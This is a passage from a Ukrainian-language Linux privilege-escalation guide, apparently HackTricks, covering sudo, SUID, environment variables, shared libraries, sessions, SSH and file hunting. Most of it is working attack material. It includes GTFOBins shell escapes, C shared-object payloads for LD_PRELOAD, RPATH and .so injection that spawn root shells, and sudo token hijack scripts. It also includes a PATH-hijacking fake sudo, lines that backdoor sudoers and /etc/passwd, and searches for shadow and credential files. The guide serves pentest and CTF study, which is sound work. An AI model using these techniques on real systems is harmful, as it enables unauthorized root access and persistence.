cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Деякі версії Linux були вразливі до бага, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Детальніше: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатувати** за допомогою: **`systemd-run -t /bin/bash`**

### Groups

Перевірте, чи ви є **членом якоїсь групи**, яка може надати вам привілеї root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Перевірте, чи є у буфері обміну щось цікаве (якщо це можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** у середовищі, **спробуйте увійти під кожним користувачем**, використовуючи цей пароль.

### Su Brute

Якщо вас не лякає велика кількість шуму і бінарні файли `su` та `timeout` присутні на комп'ютері, ви можете спробувати перебрати пароль користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається перебрати паролі користувачів.

## Зловживання записуваними елементами $PATH

### $PATH

Якщо ви виявите, що можете **записувати в якусь папку з $PATH**, ви можете підвищити привілеї, **створивши backdoor у цій записуваній папці** з іменем команди, яка має виконуватися іншим користувачем (ідеально — root), і яка **не завантажується з папки, що розташована перед вашою записуваною папкою в $PATH**.

### SUDO та SUID

Вам може бути дозволено виконати певну команду за допомогою sudo або вони можуть мати suid-біт. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати і/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволити користувачеві виконати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`; тепер тривіально отримати shell, додавши ssh key у директорію `root` або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **на основі HTB machine Admirer**, був **уразливий** до **PYTHONPATH hijacking** для завантаження довільної python library під час виконання скрипта як root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережено через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), можна скористатися неінтерактивною поведінкою запуску Bash, щоб виконати довільний код від імені root при виклику дозволеної команди.

- Why it works: Для неінтерактивних shell-ів Bash оцінює `$BASH_ENV` і sources цей файл перед запуском цільового скрипта. Багато правил sudo дозволяють запуск скрипта або shell-обгортки. Якщо `BASH_ENV` зберігається sudo, ваш файл буде sourced з привілеями root.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash-скрипт).
- `BASH_ENV` присутній в `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Зміцнення безпеки:
- Видаліть `BASH_ENV` (та `ENV`) з `env_keep`, віддавайте перевагу `env_reset`.
- Уникайте shell wrappers для sudo-allowed команд; використовуйте мінімальні binaries.
- Розгляньте sudo I/O logging та alerting, коли використовуються preserved env vars.

### Шляхи обходу виконання sudo

**Перейдіть** щоб прочитати інші файли або використати **symlinks**. Наприклад, у sudoers файлі: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Заходи протидії**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без шляху до команди

Якщо користувачу надано **дозвіл sudo** для однієї команди **без вказання шляху**: _hacker10 ALL= (root) less_ — ви можете експлуатувати це, змінивши змінну PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використати, якщо **suid** бінарник **виконує іншу команду без вказання шляху до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст підозрілого SUID бінарника)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Якщо **suid** бінарник **виконує іншу команду з вказаним шляхом**, то ви можете спробувати **експортувати функцію** з іменем тієї команди, яку викликає suid файл.

Наприклад, якщо suid бінарник викликає _**/usr/sbin/service apache2 start**_, вам потрібно спробувати створити функцію та експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Потім, коли ви викличете suid binary, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна оточення **LD_PRELOAD** використовується для вказівки однієї або кількох спільних бібліотек (.so файлів), які завантажуються завантажувачем перед усіма іншими, включно зі стандартною бібліотекою C (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, щоб підтримувати безпеку системи та запобігти зловживанню цією функцією, особливо щодо **suid/sgid** виконуваних файлів, система накладає певні умови:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ідентифікатор користувача (_ruid_) не збігається з ефективним (_euid_).
- Для виконуваних файлів з suid/sgid попередньо завантажуються лише бібліотеки у стандартних шляхах, які також мають suid/sgid.

Підвищення привілеїв може статися, якщо ви маєте можливість виконувати команди з `sudo`, і вивід `sudo -l` містить рядок **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній оточення **LD_PRELOAD** зберігатися й бути розпізнаною навіть під час виконання команд з `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте це** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** виконуючи
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Подібний privesc може бути використаний, якщо зловмисник контролює **LD_LIBRARY_PATH** env variable, оскільки це визначає шлях, у якому будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Якщо ви натрапили на binary з правами **SUID**, який виглядає підозріло, корисно перевірити, чи він правильно завантажує **.so** файли. Це можна зробити, виконавши наступну команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, поява помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб це експлуатувати, слід створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, який містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпуляції дозволами файлів та виконання shell з підвищеними привілеями.

Скомпілюйте вищевказаний C file у shared object (.so) file за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary має спровокувати exploit, що може призвести до компрометації системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує бібліотеку з папки, в яку ми можемо записувати, створимо бібліотеку в цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що бібліотека, яку ви згенерували, повинна мати функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це кураторський список Unix бінарних утиліт, які можуть бути використані атакуючим для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **лише вставляти аргументи** у команду.

Проект збирає легітимні функції Unix бінарників, які можуть бути зловживані для виходу з restricted shells, escalate або підтримання elevated privileges, передачі файлів, створення bind і reverse shells, та полегшення інших post-exploitation задач.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви можете виконати `sudo -l`, ви можете скористатися інструментом [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) щоб перевірити, чи він знаходить спосіб експлуатувати будь-яке правило sudo.

### Повторне використання sudo токенів

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете підвищити привілеї, **чекаючи виконання команди sudo і потім перехопивши session token**.

Вимоги для підвищення привілеїв:

- Ви вже маєте shell як користувач "_sampleuser_"
- "_sampleuser_" **використовував `sudo`** для виконання чогось в **останні 15mins** (за замовчуванням це тривалість sudo token, який дозволяє нам використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово увімкнути `ptrace_scope` командою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно змінити `/etc/sysctl.d/10-ptrace.conf` і встановити `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконано, **ви можете підвищити привілеї використовуючи:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Перший експлойт (`exploit.sh`) створить бінарний файл `activate_sudo_token` в _/tmp_. Ви можете використати його, щоб **активувати sudo token у вашій сесії** (ви автоматично не отримаєте root shell, виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **який належить root і має setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить файл sudoers**, який робить **sudo tokens вічними та дозволяє всім користувачам користуватися sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права запису** у папці або на будь-якому зі створених у цій папці файлів, ви можете використовувати бінарний файл [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell від імені цього користувача з PID 1234, ви можете **отримати привілеї sudo** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можна читати лише користувачу root та групі root**.\
**Якщо** ви можете **прочитати** цей файл, ви можете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете записувати, ви можете зловживати цим дозволом
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ще один спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD, не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини й використовує `sudo`** для підвищення привілеїв і ви отримали shell у контексті цього користувача, ви можете **створити новий sudo executable**, який виконуватиме ваш код як root, а потім команду користувача. Далі **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб коли користувач виконує `sudo`, запускався ваш sudo executable.

Зауважте, що якщо користувач використовує інший shell (не bash), потрібно змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти у [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустивши щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільні бібліотеки

### ld.so

Файл `/etc/ld.so.conf` вказує **з яких місць завантажуються файли конфігурації**. Зазвичай цей файл містить такий рядок: `include /etc/ld.so.conf.d/*.conf`

Це означає, що файли конфігурації з `/etc/ld.so.conf.d/*.conf` будуть прочитані. Ці файли конфігурації **вказують на інші каталоги**, де будуть **шукатися бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — це `/usr/local/lib`. **Це означає, що система буде шукати бібліотеки в `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права запису** на будь-який із зазначених шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-який файл всередині `/etc/ld.so.conf.d/` або будь-який каталог, вказаний у файлі конфігурації з `/etc/ld.so.conf.d/*.conf`, він може отримати підвищення привілеїв.\
Дивіться **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Копіювання lib у `/var/tmp/flag15/` призведе до того, що програма використовуватиме його в цьому місці, як вказано в змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities provide a **subset of the available root privileges to a process**. Це фактично розбиває root **привілеї на менші та відмінні одиниці**. Кожну з цих одиниць можна потім окремо надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Права доступу до директорій

У директорії **біт "execute"** означає, що відповідний користувач може **"cd"** у папку.\
Біт **"read"** означає, що користувач може **переглядати** **файли**, а біт **"write"** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACLs

Списки контролю доступу (ACLs) представляють вторинний рівень дискреційних дозволів, здатний **перевизначати традиційні ugo/rwx permissions**. Ці дозволи покращують контроль доступу до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або частиною групи. Цей рівень **гранулярності забезпечує більш точне керування доступом**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надати** користувачу "kali" права читання та запису над файлом:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs із системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell sessions

У **старих версіях** ви можете **hijack** деяку **shell** session іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** до screen sessions лише **свого користувача**. Однак ви можете знайти **цікаву інформацію всередині session**.

### screen sessions hijacking

**Перелічити screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема зі **старими версіями tmux**. Я не міг перехопити tmux (v2.1) сесію, створену root, будучи непривілейованим користувачем.

**Список tmux-сесій**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH keys, згенеровані на системах на базі Debian (Ubuntu, Kubuntu, etc) між вереснем 2006 і 13 травня 2008 року, можуть бути уразливими до цієї помилки.\
Ця помилка виникає при створенні нового ssh key в тих ОС, оскільки **було можливих лише 32,768 варіантів**. Це означає, що всі можливості можна перерахувати і **маючи ssh public key ви можете шукати відповідний private key**. Ви можете знайти перераховані варіанти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Вказує, чи дозволена аутентифікація за паролем. За замовчуванням — `no`.
- **PubkeyAuthentication:** Вказує, чи дозволена аутентифікація за public key. За замовчуванням — `yes`.
- **PermitEmptyPasswords**: Якщо дозволена аутентифікація за паролем, вказує, чи дозволяє сервер вхід в облікові записи з порожніми рядками паролів. За замовчуванням — `no`.

### PermitRootLogin

Вказує, чи може root входити через ssh, за замовчуванням — `no`. Можливі значення:

- `yes`: root може входити використовуючи пароль та private key
- `without-password` or `prohibit-password`: root може входити тільки з private key
- `forced-commands-only`: root може входити тільки використовуючи private key і якщо вказані опції commands
- `no` : заборонено

### AuthorizedKeysFile

Вказує файли, які містять public keys, що можуть бути використані для аутентифікації користувача. Він може містити токени, такі як `%h`, які будуть замінені домашнім каталогом. **Ви можете вказувати абсолютні шляхи** (які починаються в `/`) або **відносні шляхи від домашньої теки користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding allows you to **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. So, you will be able to **jump** via ssh **to a host** and from there **jump to another** host **using** the **key** located in your **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` є `*`, то щоразу, коли користувач підключається до іншої машини, ця машина зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перезаписувати** ці **параметри** та дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати цим, щоб підвищити привілеї**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає новий shell**. Тому, якщо ви можете **записати або змінити будь-який із них, ви можете підвищити привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо виявлено якийсь підозрілий скрипт профілю, його слід перевірити на наявність **чутливих даних**.

### Passwd/Shadow Files

Залежно від OS файли `/etc/passwd` і `/etc/shadow` можуть мати іншу назву або існувати резервні копії. Тому рекомендовано **знайти всі** з них і **перевірити, чи можете їх прочитати**, щоб побачити **чи є hashes** всередині файлів:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках можна знайти **password hashes** у файлі `/etc/passwd` (або еквівалентному)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Доступний для запису /etc/passwd

Спершу згенеруйте пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Потім додайте користувача `hacker` і додайте згенерований пароль.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використати команду `su` з обліковими даними `hacker:hacker`

Альтернативно, ви можете використати наступні рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може знизити поточний рівень безпеки машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На платформах BSD `/etc/passwd` розташований у `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано на `/etc/spwd.db`.

Ви повинні перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині працює **tomcat** сервер і ви можете **змінити файл конфігурації сервісу Tomcat у /etc/systemd/,** то ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконано наступного разу, коли tomcat буде запущено.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, які містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це додаток з відкритим вихідним кодом, який використовується для отримання великої кількості паролів, збережених на локальному комп'ютері під Windows, Linux & Mac.

### Logs

Якщо ви можете читати logs, ви можете знайти **цікаву/конфіденційну інформацію всередині них**. Чим дивніші logs, тим цікавішими вони, ймовірно, будуть.\
Також деякі "**bad**" сконфігуровані (backdoored?) **audit logs** можуть дозволити вам **записувати паролі** всередині audit logs, як пояснено в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб читати логи, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell файли
```bash
